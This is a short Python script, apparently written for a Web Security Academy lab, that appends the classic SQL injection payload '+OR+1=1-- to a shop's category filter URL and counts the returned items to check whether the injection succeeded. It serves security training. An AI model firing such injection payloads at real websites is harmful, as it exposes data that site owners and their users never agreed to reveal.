from bs4 import BeautifulSoup
import requests

url = "https://0a99008004da85dd80acdb9f002600d5.web-security-academy.net/filter?category=Gifts"
page = requests.get(url)
soup = BeautifulSoup(page.text, features="lxml")

items = soup.find_all('section', class_='container-list-tiles')
div_count = len(items[0].find_all('div'))

payload = "'+OR+1=1--"
pageP = requests.get(url+payload)
soupP = BeautifulSoup(pageP.text, features="lxml")
itemsP = soupP.find_all('section',class_='container-list-tiles')
divP_count = len(itemsP[0].find_all('div'))

if divP_count > div_count :
    print ("SQL injection successful ! ")
else :
    print("SQL injection unsuccessful")


